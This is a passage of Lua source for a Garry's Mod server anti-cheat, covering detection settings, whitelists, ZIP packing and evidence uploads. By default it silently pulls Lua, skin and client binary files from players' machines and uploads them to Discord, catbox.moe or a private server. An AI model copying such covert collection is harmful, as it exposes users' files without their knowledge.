    swPlayerState[sid] = "clean"
    SaveSwState()
end

LoadSwState()

-- CD_SOFT_WARN: «мягкий» детект → предупреждение (красный экран + кик, бан только
-- на повтор). Пассивные эвристики силвары. Жёсткие сигналы (kefir-сигнатуры,
-- honeypot, net-tamper, track_wipe) сюда НЕ входят → мгновенный бан.
local SW_SOFT_PREFIXES = { "sw_", "screengrab", "unknown_globals", "suspicious_hooks" }
local function IsSoftSwReason(bare)
    for _, p in ipairs(SW_SOFT_PREFIXES) do
        if string.sub(bare, 1, #p) == p then return true end
    end
    return false
end
local function IsPurelySwDetection(reasons)
    if #reasons == 0 then return false end
    for _, r in ipairs(reasons) do
        local bare = r
        if string.sub(r, 1, 2) == "S:" or string.sub(r, 1, 2) == "W:" then
            bare = string.sub(r, 3)
        end
        if not IsSoftSwReason(bare) then return false end
    end
    return true
end


local CVAR_ACTION = CreateConVar("rp_silkware_action", "ban",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Что делать при детекте чита: log / kick / ban")

local CVAR_HONEYPOT = CreateConVar("rp_silkware_honeypot", "0",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Honeypot-приманка chat_relay_ping (0=ВЫКЛ — давала ложные срабатывания; 1=вкл, отладка)")

local CVAR_TAMPER = CreateConVar("rp_silkware_tamper", "0",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Детект подмены net.* ac_bypass_tamper (0=ВЫКЛ — ложил чистых; 1=вкл, отладка)")

-- CD_BYTECODE_PROBE: УНИВЕРСАЛЬНЫЙ детектор компилированных читов. На чистом GMod
-- загрузка байткода ОТКЛЮЧЕНА движком (CompileString/loadstring на байткоде →
-- строка-ошибка). Компилированные читы (Kefir, mayrr, большинство платных) грузят
-- свой payload из байткода → ОБЯЗАНЫ расхукать luaL_loadbufferx → проба вернёт
-- function → детект. FP≈0 (у легит-клиента нет причин включать загрузку байткода).
-- Цена: на чистом клиенте движок печатает 'Cannot run byte code!' в его консоль
-- (косметика, игроки консоль обычно не смотрят). Default ВКЛ — это самый надёжный
-- одиночный сигнал. Выключить: rp_silkware_kefir_bc 0.
local CVAR_KEFIR_BC = CreateConVar("rp_silkware_kefir_bc", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Универсальная байткод-проба (детект компилированных читов Kefir/mayrr/платных): 1/0")

local CVAR_CHECK_ADMINS = CreateConVar("rp_silkware_check_admins", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Авто-проверять админов (1) — детект только в отчёт, без бана; 0 — не проверять")


local DETECT_REASON   = "ЧечаДефендер: Код 4"
local SCREEN_DIR      = "zb_ac_screens"
local SCREEN_TIMEOUT  = 15
local CHECK_INTERVAL  = 30
local RESPONSE_TIMEOUT = 8

local CVAR_BINGRAB = CreateConVar("rp_silkware_bingrab", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Перед баном выкачивать файлы клиента (bin/ + локальная lua/) как доказательство: 1/0")

local CVAR_COLLECT_JOIN = CreateConVar("rp_silkware_collect_join", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Сбор lua у КАЖДОГО игрока при заходе: у кого есть lua → всегда отчёт со списком имён в Discord; ZIP файлов дедуп по отпечатку (повтор — без перезаливки): 1/0")

-- CD_SKINS_PULL: реально выкачивать скин-файлы (материалы/модели), а не только
-- список путей. Едут отдельным архивом ac_skins_*.zip тем же bin-grab-каналом.
-- Объём ограничен фильтром+капами+дедупом (см. SKIN_ROOTS/MAX_SKINS ниже).
local CVAR_SKINS_PULL = CreateConVar("rp_silkware_skins_pull", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Выкачивать сами скин-файлы клиента (не только список путей): 1/0")

local CVAR_FORENSIC = CreateConVar("rp_silkware_forensic", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Forensic sweep при детекте: полный скан всех файлов + дамп хуков/глобалов + контент-скан (1/0)")

local CVAR_WARNING = CreateConVar("rp_silkware_warning", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Красный fullscreen-экран предупреждения при детекте SilkWare (1/0)")

-- CD_MONITOR_MODE: режим наблюдения — АЧ детектит, репортит в панель/Discord и
-- собирает улики (выкачка), но НЕ применяет никаких игровых действий (ни бан,
-- ни кик, ни красный экран). Включается либо этим cvar, либо конфигом лицензии
-- ZB_AC.Config.monitor=true (панель). Приоритет: конфиг ИЛИ cvar.
local CVAR_MONITOR = CreateConVar("rp_silkware_monitor", "0",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Режим наблюдения: только детект+отчёт+выкачка, без бан/кик/предупреждений (1/0)")

local BIN_DIR      = "zb_ac_bin"
local BIN_TIMEOUT  = 120
local BIN_MAX_FILE = 4 * 1024 * 1024


local STOCK_LUA_LIST = [[
autorun/base_npcs.lua
autorun/base_vehicles.lua
autorun/client/demo_recording.lua
autorun/client/gm_demo.lua
autorun/developer_functions.lua
autorun/game_hl2.lua
autorun/menubar.lua
autorun/properties.lua
autorun/properties/bodygroups.lua
autorun/properties/bone_manipulate.lua
autorun/properties/collisions.lua
autorun/properties/drive.lua
autorun/properties/editentity.lua
autorun/properties/gravity.lua
autorun/properties/ignite.lua
autorun/properties/keep_upright.lua
autorun/properties/kinect_controller.lua
autorun/properties/npc_scale.lua
autorun/properties/persist.lua
autorun/properties/remove.lua
autorun/properties/skin.lua
autorun/properties/statue.lua
autorun/server/admin_functions.lua
autorun/server/sensorbones/css.lua
autorun/server/sensorbones/eli.lua
autorun/server/sensorbones/tf2_engineer.lua
autorun/server/sensorbones/tf2_heavy.lua
autorun/server/sensorbones/tf2_medic.lua
autorun/server/sensorbones/tf2_pyro_demo.lua
autorun/server/sensorbones/tf2_scout.lua
autorun/server/sensorbones/tf2_sniper.lua
autorun/server/sensorbones/tf2_spy_solider.lua
autorun/server/sensorbones/valvebiped.lua
autorun/utilities_menu.lua
derma/derma.lua
derma/derma_animation.lua
derma/derma_example.lua
derma/derma_gwen.lua
derma/derma_menus.lua
derma/derma_utils.lua
derma/init.lua
drive/drive_base.lua
drive/drive_noclip.lua
drive/drive_sandbox.lua
entities/sent_ball.lua
entities/widget_arrow.lua
entities/widget_axis.lua
entities/widget_base.lua
entities/widget_bones.lua
entities/widget_disc.lua
includes/extensions/angle.lua
includes/extensions/client/entity.lua
includes/extensions/client/globals.lua
includes/extensions/client/panel.lua
includes/extensions/client/panel/animation.lua
includes/extensions/client/panel/dragdrop.lua
includes/extensions/client/panel/scriptedpanels.lua
includes/extensions/client/panel/selections.lua
includes/extensions/client/player.lua
includes/extensions/client/render.lua
includes/extensions/coroutine.lua
includes/extensions/debug.lua
includes/extensions/entity.lua
includes/extensions/entity_iter.lua
includes/extensions/ents.lua
includes/extensions/file.lua
includes/extensions/game.lua
includes/extensions/math.lua
includes/extensions/math/ease.lua
includes/extensions/motionsensor.lua
includes/extensions/net.lua
includes/extensions/player.lua
includes/extensions/player_auth.lua
includes/extensions/string.lua
includes/extensions/table.lua
includes/extensions/util.lua
includes/extensions/util/worldpicker.lua
includes/extensions/vector.lua
includes/extensions/weapon.lua
includes/gmsave.lua
includes/gmsave/entity_filters.lua
includes/gmsave/physics.lua
includes/gmsave/player.lua
includes/gui/icon_progress.lua
includes/init.lua
includes/init_menu.lua
includes/menu.lua
includes/modules/ai_schedule.lua
includes/modules/ai_task.lua
includes/modules/baseclass.lua
includes/modules/cleanup.lua
includes/modules/concommand.lua
includes/modules/constraint.lua
includes/modules/construct.lua
includes/modules/controlpanel.lua
includes/modules/cookie.lua
includes/modules/cvars.lua
includes/modules/draw.lua
includes/modules/drive.lua
includes/modules/duplicator.lua
includes/modules/effects.lua
includes/modules/gamemode.lua
includes/modules/halo.lua
includes/modules/hook.lua
includes/modules/http.lua
includes/modules/killicon.lua
includes/modules/list.lua
includes/modules/markup.lua
includes/modules/matproxy.lua
includes/modules/menubar.lua
includes/modules/notification.lua
includes/modules/numpad.lua
includes/modules/player_manager.lua
includes/modules/presets.lua
includes/modules/properties.lua
includes/modules/saverestore.lua
includes/modules/scripted_ents.lua
includes/modules/search.lua
includes/modules/spawnmenu.lua
includes/modules/team.lua
includes/modules/undo.lua
includes/modules/usermessage.lua
includes/modules/utf8.lua
includes/modules/weapons.lua
includes/modules/widget.lua
includes/util.lua
includes/util/client.lua
includes/util/color.lua
includes/util/javascript_util.lua
includes/util/model_database.lua
includes/util/sql.lua
includes/util/tooltips.lua
includes/util/vgui_showlayout.lua
includes/util/workshop_files.lua
includes/vgui_base.lua
matproxy/player_color.lua
matproxy/player_weapon_color.lua
matproxy/sky_paint.lua
menu/background.lua
menu/cef_credits.lua
menu/crosshair_setup.lua
menu/demo_to_video.lua
menu/derma_icon_browser.lua
menu/errors.lua
menu/getmaps.lua
menu/loading.lua
menu/mainmenu.lua
menu/menu.lua
menu/menu_addon.lua
menu/menu_demo.lua
menu/menu_dupe.lua
menu/menu_save.lua
menu/motionsensor.lua
menu/mount/mount.lua
menu/mount/vgui/addon_rocket.lua
menu/mount/vgui/workshop.lua
menu/openurl.lua
menu/problems/permissions.lua
menu/problems/problem_generic.lua
menu/problems/problem_lua.lua
menu/problems/problems.lua
menu/problems/problems_pnl.lua
menu/ugcpublish.lua
menu/util.lua
menu/video.lua
postprocess/bloom.lua
postprocess/bokeh_dof.lua
postprocess/color_modify.lua
postprocess/dof.lua
postprocess/frame_blend.lua
postprocess/motion_blur.lua
postprocess/overlay.lua
postprocess/sharpen.lua
postprocess/sobel.lua
postprocess/stereoscopy.lua
postprocess/sunbeams.lua
postprocess/super_dof.lua
postprocess/texturize.lua
postprocess/toytown.lua
send.txt
skins/default.lua
vgui/DPanPanel.lua
vgui/contextbase.lua
vgui/dadjustablemodelpanel.lua
vgui/dalphabar.lua
vgui/dbinder.lua
vgui/dbubblecontainer.lua
vgui/dbutton.lua
vgui/dcategorycollapse.lua
vgui/dcategorylist.lua
vgui/dcheckbox.lua
vgui/dcolorbutton.lua
vgui/dcolorcombo.lua
vgui/dcolorcube.lua
vgui/dcolormixer.lua
vgui/dcolorpalette.lua
vgui/dcolumnsheet.lua
vgui/dcombobox.lua
vgui/ddragbase.lua
vgui/ddrawer.lua
vgui/dentityproperties.lua
vgui/dexpandbutton.lua
vgui/dfilebrowser.lua
vgui/dform.lua
vgui/dframe.lua
vgui/dgrid.lua
vgui/dhorizontaldivider.lua
vgui/dhorizontalscroller.lua
vgui/dhscrollbar.lua
vgui/dhtml.lua
vgui/dhtmlcontrols.lua
vgui/diconbrowser.lua
vgui/diconlayout.lua
vgui/dimage.lua
vgui/dimagebutton.lua
vgui/dkillicon.lua
vgui/dlabel.lua
vgui/dlabeleditable.lua
vgui/dlabelurl.lua
vgui/dlistbox.lua
vgui/dlistlayout.lua
vgui/dlistview.lua
vgui/dlistview_column.lua
vgui/dlistview_line.lua
vgui/dmenu.lua
vgui/dmenubar.lua
vgui/dmenuoption.lua
vgui/dmenuoptioncvar.lua
vgui/dmodelpanel.lua
vgui/dmodelselect.lua
vgui/dmodelselectmulti.lua
vgui/dnotify.lua
vgui/dnumberscratch.lua
vgui/dnumberwang.lua
vgui/dnumpad.lua
vgui/dnumslider.lua
vgui/dpanel.lua
vgui/dpanellist.lua
vgui/dpaneloverlay.lua
vgui/dpanelselect.lua
vgui/dprogress.lua
vgui/dproperties.lua
vgui/dpropertysheet.lua
vgui/drgbpicker.lua
vgui/dscrollbargrip.lua
vgui/dscrollpanel.lua
vgui/dshape.lua
vgui/dsizetocontents.lua
vgui/dslider.lua
vgui/dsprite.lua
vgui/dtextentry.lua
vgui/dtilelayout.lua
vgui/dtooltip.lua
vgui/dtree.lua
vgui/dtree_node.lua
vgui/dtree_node_button.lua
vgui/dverticaldivider.lua
vgui/dvscrollbar.lua
vgui/fingerposer.lua
vgui/fingervar.lua
vgui/imagecheckbox.lua
vgui/material.lua
vgui/matselect.lua
vgui/prop_boolean.lua
vgui/prop_combo.lua
vgui/prop_entity.lua
vgui/prop_float.lua
vgui/prop_generic.lua
vgui/prop_int.lua
vgui/prop_vectorcolor.lua
vgui/propselect.lua
vgui/slidebar.lua
vgui/spawnicon.lua
vgui/vgui_panellist.lua
weapons/weapon_fists.lua
weapons/weapon_flechettegun.lua
weapons/weapon_medkit.lua
fonts/11246.ttf
fonts/Sagewold-Regular.otf
fonts/fontawesome.ttf
fonts/main.ttf
fonts/verdana.ttf
fonts/verdanab.ttf
fonts/verdanai.ttf
fonts/verdanaz.ttf
]]

local STOCK_LUA_SET = {}
for _line in string.gmatch(STOCK_LUA_LIST, "[^\r\n]+") do
    STOCK_LUA_SET[string.lower(_line)] = true
end

-- CD_SKINS_PULL: реальная выкачка скин-файлов (не только список путей). Едет тем
-- же bin-grab пайплайном (манифест → дедуп по хэшу → чанки → CPStore), но клиент
-- дополнительно сканит корни материалов/моделей (loose-файлы, BASE_PATH — как
-- скин-скан браузера), а сервер отдаёт их ОТДЕЛЬНЫМ архивом ac_skins_*.zip.
-- Объём ограничен: только скин-расширения, стоковый фильтр, кап числа файлов,
-- пер-файловый кап (BIN_MAX_FILE), и дедуп (каждый уникальный файл — один раз).
local SKIN_ROOTS = {
    "garrysmod/materials/models",
    "garrysmod/models",
    "garrysmod/materials/vgui",
    "garrysmod/materials/entities",
    "garrysmod/materials/player",
}
local SKIN_EXT_LIST = "vmt vtf mdl vtx vvd phy" -- расширения скинов/моделей
local MAX_SKINS = 400                            -- кап числа скин-файлов на игрока
-- Стоковый фильтр по ПРЕФИКСАМ путей (движковый/дефолтный loose-контент — шум).
local STOCK_SKIN_PREFIX_LIST = table.concat({
    "garrysmod/materials/models/shadertest",
    "garrysmod/materials/models/debug",
    "garrysmod/materials/models/error",
    "garrysmod/materials/vgui/logos/ui",
    "garrysmod/materials/dev",
    "garrysmod/models/error",
    "garrysmod/models/dav0r",
    "garrysmod/models/props_junk",
}, "\n")

-- Скин-файл ли это (по пути) — сервер использует для сплита lua/скины и фильтра.
local function IsSkinPath(p)
    p = string.lower(string.gsub(tostring(p or ""), "\\", "/"))
    for _, root in ipairs(SKIN_ROOTS) do
        if string.sub(p, 1, #root) == string.lower(root) then return true end
    end
    return false
end

local SESSION_SALT = util.SHA1(tostring(SysTime()) .. tostring(math.random(1, 1e9)) ..
                               tostring(os.time()))

local function GenChannelName(prefix)
    local seed = SESSION_SALT ..
                 tostring(SysTime()) ..
                 tostring(math.random()) ..
                 tostring(#tostring({}))
    return prefix .. string.sub(util.SHA1(seed), 1, 12)
end


if not file.IsDir(SCREEN_DIR, "DATA") then
    file.CreateDir(SCREEN_DIR)
end
if not file.IsDir(BIN_DIR, "DATA") then
    file.CreateDir(BIN_DIR)
end

local pendingChecks = {}
local pendingGrabs  = {}
local pendingBin    = {}
local lastGrabReqName = {}

local POOL_SIZE = 24
local respPool, grabReqPool, grabChunkPool = {}, {}, {}
local grabAckPool     = {}
local binChunkPool    = {}
local binManiPool     = {}
local binPullPool     = {}
local binAckPool      = {}
local testScreenPool  = {}
local pendingTestScr  = {}
local kefirProbePool  = {}
local pendingKefir    = {}
local pendingHoneypot = {}
local honeypotMiss    = {}
local realAnsweredAt  = {}

local function PickRandom(pool)
    return pool[math.random(1, #pool)]
end

local playerHistory = {}

local function recordHistory(sid, strongList, weakList)
    if #strongList == 0 and #weakList == 0 then return end
    local h = playerHistory[sid]
    if not h then
        h = { hadDetection = false, lastSignals = {}, firstDetectionAt = nil }
        playerHistory[sid] = h
    end
    h.hadDetection = true
    h.firstDetectionAt = h.firstDetectionAt or os.time()
    h.lastSignals = {}
    for _, s in ipairs(strongList) do h.lastSignals[#h.lastSignals + 1] = "S:" .. s end
    for _, w in ipairs(weakList)   do h.lastSignals[#h.lastSignals + 1] = "W:" .. w end
end



local EXEMPT_GROUPS = {
    admin       = true,
    superadmin  = true,
    moderator   = true,
    dmoderator  = true,
    dadmin      = true,
    dsuperadmin = true,
    operator    = true,
}

local function IsExempt(ply)
    if not IsValid(ply) then return false end
    if ply:IsAdmin() then return true end
    if EXEMPT_GROUPS[ply:GetUserGroup()] then return true end
    return false
end

local WHITELIST_FILE = "zb_ac_whitelist.txt"
local WHITELIST = {}

local OWNER_WHITELIST = {
    ["STEAM_0:1:638412561"] = true,
}

local function NormalizeSteamID(s)
    return string.upper(string.Trim(s or ""))
end

local function LoadWhitelist()
    WHITELIST = {}
    for sid in pairs(OWNER_WHITELIST) do
        WHITELIST[NormalizeSteamID(sid)] = true
    end
    local raw = file.Read(WHITELIST_FILE, "DATA")
    if not raw then return end
    for line in string.gmatch(raw, "[^\r\n]+") do
        local sid = NormalizeSteamID(line)
        if sid ~= "" and string.sub(sid, 1, 1) ~= "#" then
            WHITELIST[sid] = true
        end
    end
end

local function SaveWhitelist()
    local lines = { "# ЧечаДефендер whitelist — SteamID по строке (авто-сейв)" }
    for sid in pairs(WHITELIST) do lines[#lines + 1] = sid end
    pcall(file.Write, WHITELIST_FILE, table.concat(lines, "\n"))
end

local IGNORE_OFF_FILE = "zb_ac_ignore_off.txt"
local IGNORE_OFF = {}

local function LoadIgnoreOff()
    IGNORE_OFF = {}
    local raw = file.Read(IGNORE_OFF_FILE, "DATA")
    if not raw then return end
    for line in string.gmatch(raw, "[^\r\n]+") do
        local sid = NormalizeSteamID(line)
        if sid ~= "" and string.sub(sid, 1, 1) ~= "#" then
            IGNORE_OFF[sid] = true
        end
    end
end

local function SaveIgnoreOff()
    local lines = { "# ЧечаДефендер — SteamID со снятым игнором (АЧ их проверяет)" }
    for sid in pairs(IGNORE_OFF) do lines[#lines + 1] = sid end
    pcall(file.Write, IGNORE_OFF_FILE, table.concat(lines, "\n"))
end

local function IsWhitelisted(plyOrSid)
    local sid
    if type(plyOrSid) == "string" then
        sid = NormalizeSteamID(plyOrSid)
    elseif IsValid(plyOrSid) then
        sid = plyOrSid:SteamID()
    end
    if not sid or sid == "" then return false end
    if IGNORE_OFF[sid] then return false end
    return WHITELIST[sid] == true
end

LoadWhitelist()
LoadIgnoreOff()

local LUA_FP_FILE = "zb_ac_lua_fingerprints.json"
local luaFingerprints = {}

local function LoadLuaFingerprints()
    luaFingerprints = {}
    local raw = file.Read(LUA_FP_FILE, "DATA")
    if not raw or raw == "" then return end
    local ok, tbl = pcall(util.JSONToTable, raw)
    if not ok or not istable(tbl) then return end
    for sid, rec in pairs(tbl) do
        local nsid = NormalizeSteamID(sid)
        if nsid ~= "" and istable(rec) and rec.hash then
            luaFingerprints[nsid] = rec
        end
    end
end

local function SaveLuaFingerprints()
    pcall(file.Write, LUA_FP_FILE, util.TableToJSON(luaFingerprints))
end

local function ClearLuaFingerprint(sid)
    sid = NormalizeSteamID(sid)
    if sid == "" or not luaFingerprints[sid] then return false end
    luaFingerprints[sid] = nil
    SaveLuaFingerprints()
    return true
end

LoadLuaFingerprints()

local function FilterLuaFileList(fileList)
    local out = {}
    for _, f in ipairs(fileList or {}) do
        local orig = string.lower(string.gsub(f.orig or f.name or "", "\\", "/"))
        if string.sub(orig, 1, 4) == "lua/" then
            local rel = string.sub(orig, 5)
            if rel ~= "" and not STOCK_LUA_SET[rel] and f.data and #f.data > 0 then
                out[#out + 1] = { name = f.orig or f.name, data = f.data }
            end
        end
    end
    return out
end

-- CD_SKINS_PULL: скин-файлы из fileList (по пути-корню), для отдельного архива.
local function FilterSkinFileList(fileList)
    local out = {}
    for _, f in ipairs(fileList or {}) do
        local orig = f.orig or f.name or ""
        if IsSkinPath(orig) and f.data and #f.data > 0 then
            out[#out + 1] = { name = orig, data = f.data }
        end
    end
    return out
end

local function ComputeLuaFingerprint(fileList)
    local ok, fp = pcall(function()
        -- CD_SKINS_PULL: отпечаток по lua И скинам — изменение любых триггерит доставку.
        local luaFiles = FilterLuaFileList(fileList)
        local skinFiles = FilterSkinFileList(fileList)
        for _, sf in ipairs(skinFiles) do luaFiles[#luaFiles + 1] = sf end
        if #luaFiles == 0 then return "__empty__" end
        local entries = {}
        for _, f in ipairs(luaFiles) do
            local path = string.lower(string.gsub(f.name or "", "\\", "/"))
            entries[#entries + 1] = path .. ":" .. util.SHA1(f.data or "")
        end
        table.sort(entries)
        return util.SHA1(table.concat(entries, "\n"))
    end)
    if ok and fp then return fp end
    print("[AC] ComputeLuaFingerprint error: " .. tostring(fp))
    return "__err__"
end

local function ShouldAutoCheck(ply)
    if not IsValid(ply) then return false end
    if ply:IsBot() then return false end -- CD_NO_BOT_CHECK: не флудим проверками ботов
    if IsWhitelisted(ply) then return false end
    if not IsExempt(ply) then return true end
    return CVAR_CHECK_ADMINS:GetBool()
end

local CVAR_CHAT_NOTIFY = CreateConVar("rp_silkware_chat", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Дублировать отчёты АЧ в чат админам (1) или нет (0 — только консоль+Discord)")

-- CD_VERBOSE: подробный лог АЧ в консоль ([AC][CHECK]/[AC][SCREEN]). По умолчанию
-- тихо — владелец не хочет флуда. rp_ac_verbose 1 → включить для отладки.
if not ConVarExists("rp_ac_verbose") then
    CreateConVar("rp_ac_verbose", "0", {FCVAR_ARCHIVE, FCVAR_PROTECTED},
        "Подробный лог АЧ в консоль (0 = тихо, по умолчанию)")
end
local function ACVerbose()
    local c = GetConVar("rp_ac_verbose")
    return c ~= nil and c:GetBool()
end
local function ScreenLog(msg) if ACVerbose() then print(msg) end end

local function NotifyStaff(msg)
    if ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify") then return end -- CD_STEALTH_NOTIFY
    if ACVerbose() then print("[AC] " .. msg) end -- CD_QUIET_CONSOLE: консоль только при rp_ac_verbose
    if not CVAR_CHAT_NOTIFY:GetBool() then return end
    for _, p in ipairs(player.GetAll()) do
        if p:IsAdmin() or p:IsSuperAdmin() then
            p:ChatPrint("[AC] " .. msg)
        end
    end
end

-- CD_HIDE_PULL: тумблер stealth.pull «Скрывать выкачку» — прячет ЛЮБЫЕ сообщения о
-- выкачке/сборе файлов на игровом сервере, НЕ трогая детекты. По умолчанию скрыто.
-- Улики к нам идут (Report/upload) независимо от этого тумблера.
local function pullHidden()
    local s = ZB_AC and ZB_AC.Config and ZB_AC.Config.stealth
    if s == true then return true end
    if istable(s) and s.pull ~= nil then return s.pull == true end
    return true -- дефолт: прятать выкачку
end
local function NotifyCollect(msg)
    if pullHidden() then return end
    NotifyStaff(msg)
end
local NotifyPull = NotifyCollect

-- CD_MONITOR_MODE: наблюдение без действий. Конфиг лицензии (панель) ИЛИ cvar.
local function MonitorMode()
    if ZB_AC and ZB_AC.Config and ZB_AC.Config.monitor == true then return true end
    return CVAR_MONITOR:GetBool()
end

local function SendDiscord(title, message, onDone)
    local payload = util.TableToJSON({
        content = "**" .. title .. ":** " .. message,
        allowed_mentions = { parse = {} },
    })
    ZB_AC.RelayPost(payload, "application/json", onDone)
end

local DISCORD_FILE_CAP = 7.5 * 1024 * 1024

local function SendDiscordFiles(title, message, files)
    files = files or {}
    local valid = {}
    for _, f in ipairs(files) do
        if f and f.data and f.data ~= "" then valid[#valid + 1] = f end
    end
    if #valid == 0 then SendDiscord(title, message) return end

    local payload = util.TableToJSON({
        content = "**" .. title .. ":** " .. message,
        allowed_mentions = { parse = {} },
    })

    local boundary = "----ZBAC" .. tostring(math.random(1, 1e9)) ..
        tostring(SysTime()):gsub("[^%w]", "")

    local CRLF  = "\r\n"
    local parts = {
        "--" .. boundary .. CRLF ..
        'Content-Disposition: form-data; name="payload_json"' .. CRLF ..
        "Content-Type: application/json" .. CRLF .. CRLF ..
        payload .. CRLF,
    }
    for i, f in ipairs(valid) do
        parts[#parts + 1] =
            "--" .. boundary .. CRLF ..
            'Content-Disposition: form-data; name="files[' .. (i - 1) .. ']"; filename="' ..
                f.name .. '"' .. CRLF ..
            "Content-Type: " .. (f.mime or "application/octet-stream") .. CRLF .. CRLF ..
            f.data .. CRLF
    end
    parts[#parts + 1] = "--" .. boundary .. "--" .. CRLF
    local body = table.concat(parts)

    ZB_AC.RelayPost(body, "multipart/form-data; boundary=" .. boundary, function(ok)
        if not ok then
            SendDiscord(title, message)
        end
    end)
end

local _crc32_tab
local function _crc32_pure(s)
    if not _crc32_tab then
        _crc32_tab = {}
        for i = 0, 255 do
            local c = i
            for _ = 1, 8 do
                if bit.band(c, 1) == 1 then
                    c = bit.bxor(0xEDB88320, bit.rshift(c, 1))
                else
                    c = bit.rshift(c, 1)
                end
            end
            _crc32_tab[i] = c
        end
    end
    local crc = 0xFFFFFFFF
    for i = 1, #s do
        crc = bit.bxor(bit.rshift(crc, 8),
            _crc32_tab[bit.band(bit.bxor(crc, string.byte(s, i)), 0xFF)])
    end
    return bit.bxor(crc, 0xFFFFFFFF) % 0x100000000
end

-- CD_CRC_NATIVE: pure-Lua CRC32 по мегабайтам zip фризит СЕРВЕР. util.CRC —
-- нативный (быстрый). Самопроверка один раз: если util.CRC совпал с эталоном
-- CRC32("123456789")=0xCBF43926 — используем нативный; иначе fallback pure-Lua
-- (корректность zip гарантирована в любом случае).
local _crc_native = nil
local function _crc32(s)
    if _crc_native == nil then
        _crc_native = false
        local ok, nat = pcall(function() return util and util.CRC and tonumber(util.CRC("123456789")) end)
        if ok and nat and (nat % 0x100000000) == 0xCBF43926 then _crc_native = true end
    end
    if _crc_native then
        return (tonumber(util.CRC(s)) or 0) % 0x100000000
    end
    return _crc32_pure(s)
end

local function _u16(n)
    n = n % 65536
    return string.char(n % 256, math.floor(n / 256) % 256)
end
local function _u32(n)
    n = n % 4294967296
    return string.char(n % 256, math.floor(n / 256) % 256,
        math.floor(n / 65536) % 256, math.floor(n / 16777216) % 256)
end

local function BuildZip(files)
    if not files or #files == 0 then return nil end
    local localParts, central = {}, {}
    local offset, count = 0, 0

    for _, f in ipairs(files) do
        local name = tostring(f.name or "file")
        local data = f.data or ""
        local sz   = #data
        local crc  = _crc32(data)
        local lh = "PK\3\4" .. _u16(20) .. _u16(0) .. _u16(0) .. _u16(0) .. _u16(0)
            .. _u32(crc) .. _u32(sz) .. _u32(sz) .. _u16(#name) .. _u16(0)
        localParts[#localParts + 1] = lh .. name .. data
        central[#central + 1] = "PK\1\2" .. _u16(20) .. _u16(20) .. _u16(0) .. _u16(0)
            .. _u16(0) .. _u16(0) .. _u32(crc) .. _u32(sz) .. _u32(sz)
            .. _u16(#name) .. _u16(0) .. _u16(0) .. _u16(0) .. _u16(0)
            .. _u32(0) .. _u32(offset) .. name
        offset = offset + #lh + #name + sz
        count  = count + 1
    end

    local cd   = table.concat(central)
    local eocd = "PK\5\6" .. _u16(0) .. _u16(0) .. _u16(count) .. _u16(count)
        .. _u32(#cd) .. _u32(offset) .. _u16(0)
    return table.concat(localParts) .. cd .. eocd
end

local function UploadToCatbox(filename, data, mime, cb)
    if not data or data == "" then cb(nil) return end
    local boundary = "----ZBCB" .. tostring(math.random(1, 1e9)) ..
        (tostring(SysTime()):gsub("[^%w]", ""))
    local CRLF = "\r\n"
    local body =
        "--" .. boundary .. CRLF ..
        'Content-Disposition: form-data; name="reqtype"' .. CRLF .. CRLF ..
        "fileupload" .. CRLF ..
        "--" .. boundary .. CRLF ..
        'Content-Disposition: form-data; name="fileToUpload"; filename="' .. filename .. '"' .. CRLF ..
        "Content-Type: " .. (mime or "application/octet-stream") .. CRLF .. CRLF ..
        data .. CRLF ..
        "--" .. boundary .. "--" .. CRLF
    HTTP({
        url     = "https://catbox.moe/user/api.php",
        method  = "POST",
        headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
        body    = body,
        type    = "multipart/form-data; boundary=" .. boundary,
        success = function(code, resp)
            if code and code >= 200 and code < 300 and isstring(resp) and resp:find("https?://") then
                cb(string.Trim(resp))
            else
                print("[AC] catbox HTTP " .. tostring(code) .. " resp=" .. tostring(resp))
                cb(nil)
            end
        end,
        failed  = function(err) print("[AC] catbox error: " .. tostring(err)) cb(nil) end,
    })
end

-- CD_CP_MIRROR: вид улики для control-plane (папка в браузере панели).
local function CPKindFor(mime, name)
    mime = tostring(mime or ""); name = tostring(name or "")
    if mime:find("^image/") then return "screenshot" end
    if name:find("forensic") then return "forensic" end
    if name:find("lua")      then return "lua" end
    if name:find("bin")      then return "bin" end
    return "file"
end

local function UploadFileHost(filename, data, mime, cb)
    if not data or data == "" then cb(nil) return end
    local mode = (ZB_AC.StorageMode and ZB_AC.StorageMode()) or "both"
    local useCP = ZB_AC.CPStore ~= nil -- CD_CP_MIRROR: улику шарим через наш сервер
    local useCatbox, useB2
    if useCP then
        -- CD_CP_ONLY: всё (файлы + скрины) идёт ТОЛЬКО через наш VPS, без внешних файлхостов.
        useCatbox, useB2 = false, false
    else
        useCatbox = mode == "both" or mode == "catbox"
        useB2     = (mode == "both" or mode == "b2") and ZB_AC.B2Ready and ZB_AC.B2Ready()
        if not useCatbox and not useB2 then useCatbox = true end
    end

    local parts   = {}
    local pending = (useCatbox and 1 or 0) + (useB2 and 1 or 0) + (useCP and 1 or 0)
    local fired   = false
    local function finish()
        if fired or pending > 0 then return end
        fired = true
        local links = {}
        if parts[3] then links[#links + 1] = parts[3] end -- CD_CP_MIRROR: ссылка на VPS первой
        if parts[1] then links[#links + 1] = parts[1] end
        if parts[2] then links[#links + 1] = parts[2] end
        cb(#links > 0 and table.concat(links, "  |  ") or nil)
    end

    if useCatbox then
        UploadToCatbox(filename, data, mime, function(url)
            if url then parts[1] = "catbox: " .. url else print("[AC] catbox выгрузка не удалась") end
            pending = pending - 1
            finish()
        end)
    end
    if useB2 then
        ZB_AC.UploadB2(filename, data, mime, function(url)
            if url then parts[2] = "B2: " .. url else print("[AC] B2 выгрузка не удалась") end
            pending = pending - 1
            finish()
        end)
    end
    if useCP then -- CD_CP_MIRROR
